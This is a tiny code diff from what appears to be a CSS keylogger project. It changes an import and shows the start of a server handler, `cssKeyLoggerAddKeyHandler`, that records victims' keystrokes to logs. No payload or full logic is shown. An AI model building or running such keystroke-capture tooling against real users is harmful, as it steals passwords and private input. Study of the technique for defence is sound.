@@ -1,4 +1,4 @@
-const loggedKeys = require("./loggedKeys");
+const { loggedKeys } = require("./keyloggerParams");
 
 const cssKeyLoggerAddKeyHandler = async (req, res) => {
   // push the recent key stroke to logs
